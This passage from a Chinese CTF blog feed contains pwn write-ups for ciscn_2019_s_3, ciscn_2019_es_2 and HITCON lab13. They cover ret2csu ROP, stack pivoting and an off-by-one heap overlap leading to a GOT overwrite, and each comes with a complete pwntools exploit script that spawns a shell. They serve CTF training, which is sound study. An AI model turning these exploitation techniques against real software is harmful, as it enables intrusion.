C0 01 00 00 00          mov     rax, 1</span><br><span class="line">.text:000000000040050A BA 30 00 00 00                mov     edx, 30h ; &#x27;0&#x27;                  ; count</span><br><span class="line">.text:000000000040050F 48 8D 74 24 F0                lea     rsi, [rsp+buf]                  ; buf</span><br><span class="line">.text:0000000000400514 48 89 C7                      mov     rdi, rax                        ; fd</span><br><span class="line">.text:0000000000400517 0F 05                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000400519 C3                            retn</span><br><span class="line">.text:0000000000400519</span><br><span class="line">.text:0000000000400519                               vuln endp ; sp-analysis failed</span><br><span class="line">.text:0000000000400519</span><br><span class="line">.text:0000000000400519                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040051A 90                            db 90h</span><br><span class="line">.text:000000000040051B                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040051B 5D                            pop     rbp</span><br><span class="line">.text:000000000040051C C3                            retn</span><br></pre></td></tr></table></figure><p>有gadget,看到3b&#x3D;59系统调用号，<code>#define __NR_execve 59</code>，可以配合syscall起shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004004D6                               public gadgets</span><br><span class="line">.text:00000000004004D6                               gadgets proc near</span><br><span class="line">.text:00000000004004D6                               ; __unwind &#123;</span><br><span class="line">.text:00000000004004D6 55                            push    rbp</span><br><span class="line">.text:00000000004004D7 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000004004DA 48 C7 C0 0F 00 00 00          mov     rax, 0Fh</span><br><span class="line">.text:00000000004004E1 C3                            retn</span><br><span class="line">.text:00000000004004E1</span><br><span class="line">.text:00000000004004E1                               gadgets endp ; sp-analysis failed</span><br><span class="line">.text:00000000004004E1</span><br><span class="line">.text:00000000004004E2                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004E2 48 C7 C0 3B 00 00 00          mov     rax, 3Bh ; &#x27;;&#x27;</span><br><span class="line">.text:00000000004004E9 C3                            retn</span><br><span class="line">.text:00000000004004E9</span><br><span class="line">.text:00000000004004E9                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004EA 90                            db 90h</span><br><span class="line">.text:00000000004004EB                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004EB 5D                            pop     rbp</span><br><span class="line">.text:00000000004004EC C3                            retn</span><br></pre></td></tr></table></figure><p>这里我们我们可以从vuln汇编最后ret前没有常规的pop ebp等，只需覆盖到ebp就可以ret到hook函数，同时程序没有&#x2F;bin&#x2F;sh string，我们还需要自己构造</p><p>vuln函数 <code>mov     edx, 30h ; &#39;0&#39;</code>输入0x30字节，我们的buf只是在0x10位置会把ebp给输出来，我们可以利用泄露的ebp，来寻址我们的输入，通过输入构造binsh</p><h2 id="泄露ebp"><a href="#泄露ebp" class="headerlink" title="泄露ebp"></a>泄露ebp</h2><p>s(b’&#x2F;bin&#x2F;sh\x00’.ljust(0x10,b’a’)+p64(ret_fun))</p><p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313004045662.png" alt="image-20230313004045662"></p><p>我们泄露0x7ffed29ae428，输入在0x7ffed29ae310。</p><p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313004213386.png" alt="image-20230313004213386"></p><p>再次返回vuln函数，泄露地址-0x118，就可以得到输入栈地址</p><h2 id="ret2cmu-getshell"><a href="#ret2cmu-getshell" class="headerlink" title="ret2cmu getshell"></a>ret2cmu getshell</h2><h3 id="first-way"><a href="#first-way" class="headerlink" title="first way"></a>first way</h3><p>padding&#x3D;b’&#x2F;bin&#x2F;sh\x00’.ljust(0x10,b’a’)<br>payload&#x3D;padding+p64(csu_end)+p64(0)*2+p64(ebp+0x50)+p64(0)*3+p64(csu_front)+p64(mov_rax)+p64(rdi)+p64(ebp)+p64(syscall)</p><p>这里我们要execve(“&#x2F;bin&#x2F;sh”,0,0)</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">将sys_execve 的调用号 59 赋值给 rax</span><br><span class="line">将第一个参数即字符串 &quot;/bin/sh&quot;的地址 赋值给 rdi</span><br><span class="line">将第二个参数 0  赋值给 rsi</span><br><span class="line">将第三个参数 0  赋值给 rdx</span><br></pre></td></tr></table></figure><p>rax,rdi,rsi 好说</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/pwn&gt; ROPgadget --binary &#x27;ciscn_2019_s_3&#x27; --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040059c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040059e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005a2 : pop r15 ; ret</span><br><span class="line">0x000000000040059b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040059f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400440 : pop rbp ; ret</span><br><span class="line">0x00000000004005a3 : pop rdi ; ret</span><br><span class="line">0x00000000004005a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040059d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004003a9 : ret</span><br></pre></td></tr></table></figure><p>rdx置零需要cmu</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">.text:0000000000400580 4C 89 EA                      mov     rdx, r13</span><br><span class="line">.text:0000000000400583 4C 89 F6                      mov     rsi, r14</span><br><span class="line">.text:0000000000400586 44 89 FF                      mov     edi, r15d</span><br><span class="line">.text:0000000000400589 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br><span class="line">.text:0000000000400589</span><br><span class="line">.text:000000000040058D 48 83 C3 01                   add     rbx, 1</span><br><span class="line">.text:0000000000400591 48 39 EB                      cmp     rbx, rbp</span><br><span class="line">.text:0000000000400594 75 EA                         jnz     short loc_400580</span><br><span class="line">.text:0000000000400594</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596                               loc_400596:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400596 48 83 C4 08                   add     rsp, 8</span><br><span class="line">.text:000000000040059A 5B                            pop     rbx</span><br><span class="line">.text:000000000040059B 5D                            pop     rbp</span><br><span class="line">.text:000000000040059C 41 5C                         pop     r12</span><br><span class="line">.text:000000000040059E 41 5D                         pop     r13</span><br><span class="line">.text:00000000004005A0 41 5E                         pop     r14</span><br><span class="line">.text:00000000004005A2 41 5F                         pop     r15</span><br><span class="line">.text:00000000004005A4 C3                            retn</span><br><span class="line">.text:00000000004005A4                               ; &#125; // starts at 400540</span><br></pre></td></tr></table></figure><p>这里我们利用40059A处的rdi，再返回到0400580，可以控制rdx，同时将rbx置零，就会call [r12+rbx*8]里的内容，也就是说这里控制流会被劫持，我们将r12里的内容控制为我们原本要ret的mov_rax即可，只不过这里是call，有意思的就是这里</p><p>call mov_ret</p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313005704624.png" alt="image-20230313005704624" style="zoom:67%;"><p>call之后会返回到 add rbx,1</p><p>这个时候 rbp和rbp一定不相等，再次回到csu_front进行call [r12+rbx*8]&#x3D;call [r12+8]也就是我们的pop rdi指令</p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313005856293.png" alt="image-20230313005856293" style="zoom:67%;"><p>这次的pop rdi 会把call [r12+8] 的返回地址pop掉这样我们ret是执行流回到payload的mov rax上然后正常rop</p><h3 id="second-way"><a href="#second-way" class="headerlink" title="second way"></a>second way</h3><p>payload&#x3D;padding+p64(csu_end)+p64(0)+p64(1)+p64(ebp+0x50)+p64(0)+p64(0)+p64(0)+p64(csu_front)+p64(mov_rax)</p><p>payload+&#x3D;b’a’*48+p64(rdi)+p64(ebp)+p64(syscall)</p><p>这里就是用一个常规的ret2cmu，将ebp和rbx去符合cmp     rbx, rbp，不跳转的跳转最后再ret到pop rdi的执行流</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12_call,r13_a3,r14_a2,r15_a1,last_ret</span>):<span class="comment">#注意第三个参数是call的r12寄存器所存地址里的地址call    qword ptr [r12+rbx*8]</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    rbx=0</span></span><br><span class="line"><span class="string">    rbp=1</span></span><br><span class="line"><span class="string">    r12= call the address in address</span></span><br><span class="line"><span class="string">    r13= rdx third argument</span></span><br><span class="line"><span class="string">    r14= rsi second argument</span></span><br><span class="line"><span class="string">    r15= edi first argument </span></span><br><span class="line"><span class="string">    last= ret address   </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=padding+fake_rbp+p64(cmu_end)+p64(rbx)+p64(rbp)+p64(r12_call)+p64(r13_a3)+p64(r14_a2)+p64(r15_a1)+p64(cmu_front)</span><br><span class="line">    payload+=fake_reg+p64(last_ret)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    <span class="comment">#fake_reg一般56字节</span></span><br></pre></td></tr></table></figure><img src="/2023/03/13/ciscn-2019-s-3/image-20230313011205443.png" alt="image-20230313011205443" style="zoom:67%;"><img src="/2023/03/13/ciscn-2019-s-3/image-20230313011338278.png" alt="image-20230313011338278" style="zoom:67%;"><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./ciscn_2019_s_3&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;29483&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line">db(<span class="string">&#x27;b *0x0400501&#x27;</span>)</span><br><span class="line">ret_fun=<span class="number">0x04004ED</span></span><br><span class="line">csu_end = <span class="number">0x040059A</span></span><br><span class="line">csu_front = <span class="number">0x0400580</span></span><br><span class="line">rdi=<span class="number">0x00000000004005a3</span></span><br><span class="line">syscall=<span class="number">0x400517</span></span><br><span class="line">mov_rax=<span class="number">0x4004E2</span></span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(ret_fun))</span><br><span class="line">r(<span class="number">0x20</span>)</span><br><span class="line">ebp=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x118</span></span><br><span class="line">p(<span class="string">&#x27;ebp&#x27;</span>,ebp)</span><br><span class="line">padding=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#first way</span></span><br><span class="line">payload=padding+p64(csu_end)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(ebp+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(csu_front)+p64(mov_rax)+p64(rdi)+p64(ebp)+p64(syscall)</span><br><span class="line"><span class="comment">#second way</span></span><br><span class="line"><span class="comment"># payload=padding+p64(csu_end)+p64(0)+p64(1)+p64(ebp+0x50)+p64(0)+p64(0)+p64(0)+p64(csu_front)+p64(mov_rax)</span></span><br><span class="line"><span class="comment"># payload+=b&#x27;a&#x27;*48+p64(rdi)+p64(ebp)+p64(syscall)</span></span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Ret2cmu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_2</title>
      <link href="/2023/03/12/ciscn-2019-es-2/"/>
      <url>/2023/03/12/ciscn-2019-es-2/</url>
      
        <content type="html"><![CDATA[<p><a href="https://files.buuoj.cn/files/3b1f1f64834cb78d6bafc0422ec4fbec/ciscn_2019_es_2">https://files.buuoj.cn/files/3b1f1f64834cb78d6bafc0422ec4fbec/ciscn_2019_es_2</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/BUU&gt; checksec ciscn_2019_es_2 </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/BUU/ciscn_2019_es_2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>漏洞函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有0x8字节可控，有system函数在</p><p>考虑栈迁移，常规我们会往bss段迁移，但是这次可以泄露处ebp</p><h2 id="泄露ebp"><a href="#泄露ebp" class="headerlink" title="泄露ebp"></a>泄露ebp</h2><p>利用printf就可以泄露出ebp</p><p>padding&#x3D;b’a’*0x28<br>sa(b’name?\n’,padding)</p><img src="/2023/03/12/ciscn-2019-es-2/image-20230312195405528.png" alt="image-20230312195405528" style="zoom: 80%;"><p>泄露出ebp&#x3D;0xff82fc88</p><h3 id="栈迁移到栈上"><a href="#栈迁移到栈上" class="headerlink" title="栈迁移到栈上"></a>栈迁移到栈上</h3><p>可以从什么看到泄露出来的ebp和我们输入的地方差0xff82fc88−0xff82fc50&#x3D;0x38</p><p>下次read也会往这个地方read，我们提前在上面布置好栈帧，将ebp覆盖为我们的输入点，也就是伪造的栈帧，再将返回地址覆盖为leave ret，这样mov esp，ebp，会到达输入点，</p><p>再pop ebp，输入点前四个字节输入junk即可，</p><img src="/2023/03/12/ciscn-2019-es-2/image-20230312195704199.png" alt="image-20230312195704199" style="zoom:80%;"><p>再ret，这里我们就可以接管执行流，bin&#x2F;sh也可以利用泄露的栈和偏移进行确定</p><p>payload2&#x3D;b’junk’+p32(elf.symbols[‘system’])+p32(0x123)+p32(ebp+0x10)+b”&#x2F;bin&#x2F;sh”<br>payload2&#x3D;payload2.ljust(0x28,b’\x00’)<br>payload2+&#x3D;p32(ebp)+p32(leave_ret)</p><p><img src="/2023/03/12/ciscn-2019-es-2/image-20230312195856603.png" alt="image-20230312195856603"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25443&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line">db(<span class="string">&#x27;b* 0x80485CD&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x08048562</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">sa(<span class="string">b&#x27;name?\n&#x27;</span>,padding)</span><br><span class="line">ru(padding)</span><br><span class="line">ebp=u32(io.recv(<span class="number">4</span>))-<span class="number">0x38</span></span><br><span class="line">p(<span class="string">&#x27;ebp&#x27;</span>,ebp)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;junk&#x27;</span>+p32(elf.symbols[<span class="string">&#x27;system&#x27;</span>])+p32(<span class="number">0x123</span>)+p32(ebp+<span class="number">0x10</span>)+<span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p32(ebp)+p32(leave_ret)</span><br><span class="line">sl(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Stack Migration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chunk Extend and Overlapping</title>
      <link href="/2023/03/10/Chunk-Extend-and-Overlapping/"/>
      <url>/2023/03/10/Chunk-Extend-and-Overlapping/</url>
      
        <content type="html"><![CDATA[<h2 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/c/p/heap&gt; checksec heapcreator</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/ctfwiki/pwn/heap/heapcreator&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>heaparray是一个在bss段的全局heap结构体数组</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> size ;</span><br><span class="line">    <span class="type">char</span> *content ;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>free后没有将content指针置零</p><p>在edit时还存在off by one漏洞</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( heaparray[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(heaparray[v1]-&gt;content, heaparray[v1]-&gt;size + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>我们可以利用空间复用的机制改掉下一个chunk的size</p><p>create(0x18, b”one”)<br>create(0x10, b”two”) </p><p>会创建出4个0x20的chunk，其中one的chunk会利用two的pre_size来存放数据</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311010202508.png" alt="image-20230311010202508"></p><p>这样我们编辑one的context就可以控制two的size</p><p>edit(0, “&#x2F;bin&#x2F;sh\x00” + “a” * 0x10 + “\x41”)</p><p>改为41</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311010444200.png" alt="image-20230311010444200"></p><p>再释放two  delete(1) 可以看到已经有了overlap的chunk</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311011034574.png" alt="image-20230311011034574"></p><p>再申请一个堆块create(0x30, p64(0) * 4 + p64(0x30) + p64(elf.got[‘free’]))</p><p>这样我们的 *heap会申请到0x20的chunk，content会申请到0x40的chunk，我们的0x40chunk会overlap到0x20的chunk，从而控制其内容，我们把他的content指针改为got就，可以在show的时候输出地址</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311012105213.png" alt="image-20230311012105213"></p><p>这样就可以得到system地址，这时候去edit two,就会修改free got里面内容，改为system，再去delete one，加上我们之前输入的binsh就可以拿到shell</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311014939768.png" alt="image-20230311014939768"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./heapcreator&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    </span><br><span class="line">db(<span class="string">&#x27;b *0x00400A43&#x27;</span>)</span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">b&quot;one&quot;</span>) </span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&quot;two&quot;</span>) </span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">b&quot;\x41&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))  <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&quot;Content : &quot;</span>)</span><br><span class="line">free_ad =u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;free_addr&#x27;</span>,free_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_ad)</span><br><span class="line">base=free_ad-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/c/p/heap&gt; checksec books_e_o </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/ctfwiki/pwn/heap/books_e_o&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="大体思路"><a href="#大体思路" class="headerlink" 